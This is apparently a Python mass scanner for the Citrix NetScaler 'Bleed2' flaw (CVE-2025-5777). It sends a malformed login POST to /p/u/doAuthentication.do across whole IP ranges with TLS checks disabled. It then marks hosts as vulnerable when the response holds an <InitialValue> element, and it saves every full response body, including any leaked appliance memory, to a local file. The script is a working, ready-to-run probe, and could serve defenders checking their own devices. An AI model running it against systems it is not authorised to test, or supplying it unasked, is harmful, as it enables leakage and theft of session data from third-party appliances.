import requests
import sys
import ipaddress
from datetime import datetime
import threading
import time
import re
import urllib3

# Disable SSL warnings for self-signed certificates
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def print_banner():
    """
    Print ASCII banner for the scanner
    """
    banner = """
    ====================================================
    =	   NetScaler Citrix Bleed2 Scanner             =
    =		  (CVE-2025-5777)                      = 
    =		    Abraham-Surf		       =
    ====================================================
    """
    print(banner)

def check_response_pattern(response_text):
    """
    Check if response contains the specific pattern <InitialValue>%.*s</InitialValue>
    where %.*s represents any characters
    
    Args:
        response_text (str): HTTP response body text
    
    Returns:
        bool: True if pattern is found, False otherwise
    """
    # Pattern to match <InitialValue>any_characters</InitialValue>
    pattern = r'<InitialValue>.*?</InitialValue>'
    return bool(re.search(pattern, response_text, re.DOTALL))

def perform_https_request(target_host, log_file=None, http_log_file=None):
    """
    Performs HTTPS POST request to the specified target host (port 443 only)
    Only logs pattern matches to result.txt, but logs all responses to http.txt
    
    Args:
        target_host (str): IP address or domain name to send the request to
        log_file (file object): Optional file object to write filtered results to
        http_log_file (file object): Optional file object to write all HTTP responses to
    
    Returns:
        dict: Result information including whether pattern was found
    """
    
    # URL construction for HTTPS only
    https_url = f"https://{target_host}/p/u/doAuthentication.do"
    
    # Headers as specified in the request
    headers = {
        'Host': target_host,
        'User-Agent': 'ThinkCyberThinkCyberThinkCyberThinkCyberThinkCyberThinkCyberThinkCyber',
        'Content-Length': '5',
        'Connection': 'keep-alive'
    }
    
    # Request body
    data = "login"
    
    pattern_found = False
    
    # Prepare result string
    result_lines = []
    result_lines.append(f"Protocol: HTTPS")
    result_lines.append(f"Target: {target_host}")
    result_lines.append(f"URL: {https_url}")
    result_lines.append(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    result_lines.append(f"Headers: {headers}")
    result_lines.append(f"Data: {data}")
    result_lines.append("-" * 50)
    
    response_text = ""
    response_headers = {}
    status_code = None
    
    try:
        # Send the POST request with timeout (HTTPS only)
        response = requests.post(https_url, headers=headers, data=data, timeout=5, verify=False)
        
        response_text = response.text
        response_headers = dict(response.headers)
        status_code = response.status_code
        
        # Check if response contains the specific pattern
        if check_response_pattern(response_text):
            pattern_found = True
        
        # Add response details
        result_lines.append(f"Status Code: {status_code}")
        result_lines.append(f"Response Headers: {response_headers}")
        result_lines.append(f"Response Body: {response_text}")
        result_lines.append("SUCCESS")
        
        if check_response_pattern(response_text):
            result_lines.append("*** PATTERN FOUND: <InitialValue>.*</InitialValue> ***")
            result_lines.append("*** VULNERABLE TO CITRIX BLEED2 ***")
        
    except requests.exceptions.RequestException as e:
        result_lines.append(f"Error occurred: {e}")
        result_lines.append("FAILED")
    except Exception as e:
        result_lines.append(f"Unexpected error: {e}")
        result_lines.append("FAILED")
    
    # Add separator
    result_lines.append("=" * 50)
    
    # Join all lines
    result_text = "\n".join(result_lines)
    
    # Log all responses to http.txt
    if http_log_file:
        http_log_file.write(result_text + "\n")
        http_log_file.flush()
    
    # Only log pattern matches to result.txt
    if check_response_pattern(response_text) and log_file:
        log_file.write(result_text + "\n")
        log_file.flush()
    
    # Console output
    https_status = "✓" if "SUCCESS" in result_text else "✗"
    pattern_status = "VULNERABLE!" if pattern_found else "Not Vulnerable"
    
    print(f"Scanning {target_host}... HTTPS:{https_status} - {pattern_status}")
    
    if pattern_found:
        print(f"*** LOGGED: {target_host} - Pattern found! ***")
    
    return {
        'target': target_host,
        'pattern_found': pattern_found,
        'result': result_text
    }

def parse_ip_range(ip_range):
    """
    Parse IP range and return list of IP addresses
    
    Args:
        ip_range (str): IP address, domain, or CIDR notation (e.g., 192.168.1.0/24)
    
    Returns:
        list: List of IP addresses to scan
    """
    try:
        # Check if it's CIDR notation
        if '/' in ip_range:
            network = ipaddress.ip_network(ip_range, strict=False)
            return [str(ip) for ip in network.hosts()]
        else:
            # Single IP or domain
            return [ip_range]
    except ValueError as e:
        print(f"Error parsing IP range: {e}")
        return []

def scan_ip_range(target_range, max_threads=10):
    """
    Scan a range of IP addresses with threading support (HTTPS only)
    Logs pattern matches to result.txt and all responses to http.txt
    
    Args:
        target_range (str): IP range in CIDR notation or single IP
        max_threads (int): Maximum number of concurrent threads
    """
    
    # Parse IP range
    ip_list = parse_ip_range(target_range)
    
    if not ip_list:
        print("No valid IPs to scan")
        return
    
    print(f"Scanning {len(ip_list)} targets on HTTPS (port 443)...")
    print(f"Pattern filter: <InitialValue>.*</InitialValue>")
    print(f"Vulnerable targets -> result.txt")
    print(f"All HTTPS responses -> http.txt")
    print("=" * 50)
    
    # Statistics tracking
    total_scanned = 0
    pattern_found_count = 0
    scan_start_time = datetime.now()
    
    # Open both log files
    with open("result.txt", "w") as log_file, open("http.txt", "w") as http_log_file:
        # Write headers for result.txt
        log_file.write(f"Scan Results - Netscaler Bleed 2 Scanner\n")
        log_file.write(f"Target Range: {target_range}\n")
        log_file.write(f"Total Targets: {len(ip_list)}\n")
        log_file.write(f"Pattern Status: Vulnerable targets only\n")
        log_file.write(f"Scan Started: {scan_start_time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        log_file.write("=" * 50 + "\n")
        
        # Write headers for http.txt
        http_log_file.write(f"HTTP POST Request Full Response Log - Netscaler Bleed 2 Scanner\n")
        http_log_file.write(f"Target Range: {target_range}\n")
        http_log_file.write(f"Total Targets: {len(ip_list)}\n")
        http_log_file.write(f"Protocol: HTTPS (port 443)\n")
        http_log_file.write(f"Scan Started: {scan_start_time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        http_log_file.write("=" * 50 + "\n")
        
        # Function to handle threaded requests
        def threaded_request(ip):
            nonlocal total_scanned, pattern_found_count
            result = perform_https_request(ip, log_file, http_log_file)
            total_scanned += 1
            if result['pattern_found']:
                pattern_found_count += 1
        
        # Create and manage threads
        threads = []
        for i, ip in enumerate(ip_list):
            # Limit concurrent threads
            while len(threads) >= max_threads:
                threads = [t for t in threads if t.is_alive()]
                time.sleep(0.1)
            
            thread = threading.Thread(target=threaded_request, args=(ip,))
            thread.start()
            threads.append(thread)
            
            # Progress indicator
            if (i + 1) % 10 == 0:
                print(f"Progress: {i + 1}/{len(ip_list)} targets processed")
        
        # Wait for all threads to complete
        for thread in threads:
            thread.join()
        
        scan_end_time = datetime.now()
        
        # Write footer with statistics to both files
        log_file.write(f"Scan Completed: {scan_end_time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        log_file.write("=" * 50 + "\n")
        
        footer_stats = f"\nScan Statistics:\n"
        footer_stats += f"Total Targets Scanned: {total_scanned}\n"
        footer_stats += f"Vulnerable Targets Found: {pattern_found_count}\n"
        footer_stats += f"Vulnerability Rate: {(pattern_found_count/total_scanned)*100:.2f}%\n"
        footer_stats += f"Scan Completed: {scan_end_time.strftime('%Y-%m-%d %H:%M:%S')}\n"
        footer_stats += "=" * 50 + "\n"
        
        http_log_file.write(footer_stats)
    
    print(f"\nScan completed!")
    print(f"Total targets scanned: {total_scanned}")
    print(f"Vulnerable targets found: {pattern_found_count}")
    print(f"Vulnerability rate: {(pattern_found_count/total_scanned)*100:.2f}%")
    print(f"Vulnerable targets saved to: result.txt")
    print(f"All HTTPS responses saved to: http.txt")

def main():
    """
    Main function to get user input and perform the HTTPS request(s)
    """
    print_banner()
    
    if len(sys.argv) > 1:
        # Use command line argument if provided
        target = sys.argv[1]
    else:
        # Get input from user
        target = input("Enter target (IP, domain, or CIDR range like 192.168.1.0/24): ").strip()
    
    if not target:
        print("Error: Please provide a valid target")
        return
    
    print(f"Filter: Only logging vulnerable targets to result.txt")
    print(f"All HTTPS responses will be logged to http.txt")
    
    # Check if it's a range scan or single target
    if '/' in target or target.count('.') == 3:
        # IP range or single IP
        if '/' in target:
            scan_ip_range(target)
        else:
            # Single IP - still use the range scanner for consistency
            scan_ip_range(target)
    else:
        # Single domain
        scan_start_time = datetime.now()
        
        with open("result.txt", "w") as log_file, open("http.txt", "w") as http_log_file:
            # Write headers for result.txt
            log_file.write(f"Scan Results - Netscaler Bleed 2 Scanner\n")
            log_file.write(f"Target Range: {target}\n")
            log_file.write(f"Total Targets: 1\n")
            log_file.write(f"Pattern Status: Vulnerable targets only\n")
            log_file.write(f"Scan Started: {scan_start_time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            log_file.write("=" * 50 + "\n")
            
            # Write headers for http.txt
            http_log_file.write(f"HTTP POST Request Full Response Log - Netscaler Bleed 2 Scanner\n")
            http_log_file.write(f"Target: {target}\n")
            http_log_file.write(f"Protocol: HTTPS (port 443)\n")
            http_log_file.write(f"Scan Started: {scan_start_time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            http_log_file.write("=" * 50 + "\n")
            
            result = perform_https_request(target, log_file, http_log_file)
            
            scan_end_time = datetime.now()
            
            # Write footers
            log_file.write(f"Scan Completed: {scan_end_time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            
            footer_stats = f"\nScan Statistics:\n"
            footer_stats += f"Vulnerability Status: {'Vulnerable' if result['pattern_found'] else 'Not Vulnerable'}\n"
            footer_stats += f"Scan Completed: {scan_end_time.strftime('%Y-%m-%d %H:%M:%S')}\n"
            
            http_log_file.write(footer_stats)
        
        if result['pattern_found']:
            print(f"Target is vulnerable! Results saved to result.txt")
        else:
            print(f"Target is not vulnerable. No results logged to result.txt")
        
        print(f"All HTTPS responses saved to http.txt")

if __name__ == "__main__":
    main()